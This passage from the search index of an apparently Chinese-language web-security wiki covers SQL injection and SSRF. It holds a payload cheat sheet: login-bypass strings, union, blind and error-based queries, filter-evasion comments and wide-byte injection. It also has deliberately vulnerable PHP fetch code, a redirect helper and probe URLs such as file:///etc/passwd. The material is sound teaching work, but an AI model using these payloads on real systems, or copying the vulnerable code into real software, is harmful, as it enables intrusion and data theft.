\u6ce8\u5165\u6f0f\u6d1e\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"web/sqli/#_2","text":"Burp Suite\uff1a Burp Suite \u4f7f\u7528\u4ecb\u7ecd Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap\uff1a sqlmap \u7528\u6237\u624b\u518c","title":"\u5e38\u7528\u5de5\u5177"},{"location":"web/sqli/#_3","text":"user() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237 database() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d version() \uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c @@datadir \uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84 concat() \uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982 concat(username,0x3a,password) group_concat() \uff1a\u548c concat() \u7c7b\u4f3c\uff0c\u5982 group_concat(DISTINCT+user,0x3a,password) \uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765 concat_ws() \uff1a\u7528\u6cd5\u7c7b\u4f3c hex() \u548c unhex() \uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801 load_file() \uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a \\\\ select xxoo into outfile '\u8def\u5f84' \uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6","title":"\u6ce8\u5165\u5e38\u89c1\u53c2\u6570"},{"location":"web/sqli/#_4","text":"","title":"\u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7"},{"location":"web/sqli/#_5","text":"-- DROP sampletable ; -- # DROP sampletable ; #","title":"\u884c\u95f4\u6ce8\u91ca"},{"location":"web/sqli/#_6","text":"/*\u6ce8\u91ca\u5185\u5bb9*/ DROP /*comment*/ sampletable ` DR /**/ OP /*\u7ed5\u8fc7\u8fc7\u6ee4*/ sampletable ` SELECT /*\u66ff\u6362\u7a7a\u683c*/ password /**/ FROM /**/ Members /*! MYSQL\u4e13\u5c5e */ SELECT /*!32302 1/0, */ 1 FROM tablename","title":"\u884c\u5185\u6ce8\u91ca"},{"location":"web/sqli/#_7","text":"ASCII() \uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c CHAR() \uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26","title":"\u5b57\u7b26\u4e32\u7f16\u7801"},{"location":"web/sqli/#_8","text":"admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--","title":"\u540e\u53f0\u4e07\u80fd\u5bc6\u7801"},{"location":"web/sqli/#_9","text":"","title":"\u6ce8\u5165\u8bed\u53e5\u5907\u5fd8"},{"location":"web/sqli/#_10","text":"SELECT database (); SELECT schema_name FROM information_schema . schemata ;","title":"\u6570\u636e\u5e93\u540d"},{"location":"web/sqli/#_11","text":"union \u67e5\u8be2 --MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; \u76f2\u6ce8 AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' \u62a5\u9519 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002","title":"\u8868\u540d"},{"location":"web/sqli/#_12","text":"union \u67e5\u8be2 UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' \u76f2\u6ce8 AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' \u62a5\u9519 -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); \u5229\u7528 PROCEDURE ANALYSE() -- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5 -- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d 1 LIMIT 1 , 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d 1 LIMIT 2 , 1 PROCEDURE ANALYSE ()","title":"\u5217\u540d"},{"location":"web/sqli/#_13","text":"-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ;","title":"\u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868"},{"location":"web/sqli/#_14","text":"-- hex \u7f16\u7801 SELECT * FROM Users WHERE username = 0 x61646D696E -- char() \u51fd\u6570 SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 )","title":"\u7ed5\u8fc7\u5f15\u53f7\u9650\u5236"},{"location":"web/sqli/#_15","text":"SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); \u4f7f\u7528 CONCAT() \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528 CONCAT_WS() \u3002 CONCAT_WS() \u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002","title":"\u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355"},{"location":"web/sqli/#_16","text":"CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ;","title":"\u6761\u4ef6\u8bed\u53e5"},{"location":"web/sqli/#_17","text":"SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - '","title":"\u5ef6\u65f6\u51fd\u6570"},{"location":"web/sqli/#order-by","text":"order by \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709 order \u6216\u8005 order by \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a \u539f\u59cb\u94fe\u63a5\uff1a http://www.test.com/list.php?order=vote \u6839\u636e vote \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570 num \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528 rand \u51fd\u6570\uff1a http://www.test.com/list.php?order=rand(true) http://www.test.com/list.php?order=rand(false) \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))","title":"order by \u540e\u7684\u6ce8\u5165"},{"location":"web/sqli/#_18","text":"\u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7 addslashes \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760 \\ \u7684\u5341\u516d\u8fdb\u5236\u4e3a %5c \uff0c\u5728\u4f60\u8f93\u5165 %bf%27 \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165 \\ \uff0c\u6b64\u65f6\u53d8\u4e3a %bf%5c%27 \uff0c %bf%5c \u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002 %bf \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f %81-%fe \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002","title":"\u5bbd\u5b57\u8282\u6ce8\u5165"},{"location":"web/sqli/#_19","text":"SQL \u6ce8\u5165\u901f\u67e5\u8868 MySQL \u6ce8\u5165\u6280\u5de7 MySQL \u6ce8\u5165\u79d1\u666e MySQL \u6ce8\u5165\u603b\u7ed3 \u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/ssrf/","text":"SSRF \u7b80\u4ecb \u00b6 SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49 SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f \u00b6 \u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e \u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport & Export RSS Feed\uff09 \u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09 Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09 \u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09 \u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0 \u00b6 file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 file_get_contents \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u5373\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002 fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 fsockopen \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u4f7f\u7528 curl \u83b7\u53d6\u6570\u636e\u3002 \u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f \u00b6 \u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528 \u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf \u00b6 \u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002 \u540e\u7aef\u5b9e\u73b0 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762 < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002 \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002 \u8f85\u52a9\u811a\u672c <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / $data \" ); ?> \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c \u534f\u8bae\u5229\u7528 \u00b6 Dict \u534f\u8bae dict://fuzz.wuyun.org:8080/helo:dict Gopher \u534f\u8bae gopher://fuzz.wuyun.org:8080/gopher File \u534f\u8bae file:///etc/passwd \u53c2\u8003\u8d44\u6599 \u00b6 \u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0 \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c","title":"SSRF \u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/ssrf/#ssrf","text":"SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49","title":"SSRF \u7b80\u4ecb"},{"location":"web/ssrf/#ssrf_1","text":"\u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e \u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport & Export RSS Feed\uff09 \u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09 Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09 \u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09","title":"SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f"},{"location":"web/ssrf/#_1","text":"file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 file_get_contents \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u5373\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002 fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 fsockopen \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u4f7f\u7528 curl \u83b7\u53d6\u6570\u636e\u3002","title":"\u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0"},{"location":"web/ssrf/#ssrf_2","text":"\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528","title":"\u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f"},{"location":"web/ssrf/#ssrf_3","text":"\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002 \u540e\u7aef\u5b9e\u73b0 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762 < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002 \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002 \u8f85\u52a9\u811a\u672c <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / 